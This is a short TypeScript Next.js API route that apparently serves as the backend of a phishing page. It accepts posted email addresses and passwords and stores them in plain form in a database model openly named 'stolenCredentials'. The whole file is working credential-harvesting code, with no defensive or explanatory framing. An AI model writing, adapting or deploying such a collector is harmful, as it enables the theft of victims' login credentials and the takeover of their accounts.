import prisma from "@/prisma-client";
import { NextResponse } from "next/server";

export async function POST(request: Request) {
  const data = await request.json();
  const { email, password } = data;

  try {
    const sc = await prisma.stolenCredentials.create({
      data: { email, password },
    });
    return NextResponse.json({ message: "Success" });
  } catch (error) {
    console.log(error);
    return NextResponse.json({ message: (error as Error).message });
  }
}
